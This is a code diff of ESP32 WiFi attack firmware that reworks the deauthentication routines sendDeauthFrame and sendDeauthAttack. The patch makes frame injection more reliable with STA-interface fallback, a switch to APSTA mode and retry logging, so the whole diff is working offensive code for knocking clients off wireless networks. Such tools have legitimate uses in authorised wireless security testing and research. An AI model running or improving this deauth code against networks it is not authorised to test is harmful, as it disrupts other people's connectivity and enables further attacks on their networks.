@@ -6720,12 +6720,31 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[20] = bssid[4];
   deauth_frame_default[21] = bssid[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send packet (try AP interface first, fall back to STA if it fails)
+  for (int k = 0; k < 3; k++) {
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    if (ret != ESP_OK) {
+      Serial.printf("deauth tx(AP) failed ret=%d, trying STA iface\n", ret);
+      ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+      if (ret != ESP_OK) {
+        Serial.printf("deauth tx(STA) also failed ret=%d\n", ret);
+        // Try switching mode to APSTA and retry once
+        Serial.println("Attempting to switch WiFi mode to APSTA and retry deauth");
+        esp_wifi_stop();
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        esp_wifi_start();
+        delay(50);
+        esp_err_t ret2 = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (ret2 != ESP_OK) {
+          Serial.printf("deauth retry after mode switch failed ret=%d\n", ret2);
+        } else {
+          Serial.println("deauth retry after mode switch succeeded");
+        }
+      }
+    }
+    delay(1);
+  }
+  packets_sent += 3;
 
   // Build AP dest packet
   deauth_frame_default[4] = bssid[0];
@@ -6749,12 +6768,30 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[20] = mac[4];
   deauth_frame_default[21] = mac[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send packet (try AP interface first, fall back to STA if it fails)
+  for (int k = 0; k < 3; k++) {
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    if (ret != ESP_OK) {
+      Serial.printf("deauth tx(AP) failed ret=%d, trying STA iface\n", ret);
+      ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+      if (ret != ESP_OK) {
+        Serial.printf("deauth tx(STA) also failed ret=%d\n", ret);
+        Serial.println("Attempting to switch WiFi mode to APSTA and retry deauth");
+        esp_wifi_stop();
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        esp_wifi_start();
+        delay(50);
+        esp_err_t ret2 = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (ret2 != ESP_OK) {
+          Serial.printf("deauth retry after mode switch failed ret=%d\n", ret2);
+        } else {
+          Serial.println("deauth retry after mode switch succeeded");
+        }
+      }
+    }
+    delay(1);
+  }
+  packets_sent += 3;
 }
 
 void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
@@ -6784,11 +6821,19 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   deauth_frame_default[21] = bssid[5];      
 
   // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send packet (try AP interface first, fall back to STA if it fails)
+  for (int k = 0; k < 3; k++) {
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    if (ret != ESP_OK) {
+      Serial.printf("deauth tx(AP) failed ret=%d, trying STA iface\n", ret);
+      ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+      if (ret != ESP_OK) {
+        Serial.printf("deauth tx(STA) also failed ret=%d\n", ret);
+      }
+    }
+    delay(1);
+  }
+  packets_sent += 3;
 }
 
 void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
@@ -7198,7 +7243,11 @@ void WiFiScan::sendAssocSleepAttack(uint32_t currentTime, bool all) {
 }
 
 void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
-  // Itterate through all access points in list
+  Serial.println("sendDeauthAttack called, dst_mac=" + dst_mac_str);
+  int selectedAps = 0;
+  for (int t = 0; t < access_points->size(); t++) if (access_points->get(t).selected) selectedAps++;
+  Serial.println("Selected APs: " + String(selectedAps) + ", total APs=" + String(access_points->size()));
+  // Iterate through all access points in list
   for (int i = 0; i < access_points->size(); i++) {
 
     // Check if active
@@ -7226,12 +7275,30 @@ void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
       deauth_frame_default[20] = access_points->get(i).bssid[4];
       deauth_frame_default[21] = access_points->get(i).bssid[5];      
 
-      // Send packet
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-      packets_sent = packets_sent + 3;
+      // Send packet (try AP interface first, fall back to STA if it fails)
+      for (int k = 0; k < 3; k++) {
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (ret != ESP_OK) {
+          Serial.printf("deauth attack tx(AP) failed ret=%d, trying STA iface\n", ret);
+          ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+          if (ret != ESP_OK) {
+            Serial.printf("deauth attack tx(STA) also failed ret=%d\n", ret);
+            Serial.println("Attempting to switch WiFi mode to APSTA and retry deauth attack");
+            esp_wifi_stop();
+            esp_wifi_set_mode(WIFI_MODE_APSTA);
+            esp_wifi_start();
+            delay(50);
+            esp_err_t ret2 = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);
+            if (ret2 != ESP_OK) {
+              Serial.printf("deauth attack retry after mode switch failed ret=%d\n", ret2);
+            } else {
+              Serial.println("deauth attack retry after mode switch succeeded");
+            }
+          }
+        }
+        delay(1);
+      }
+      packets_sent += 3;
     }
   }
 }
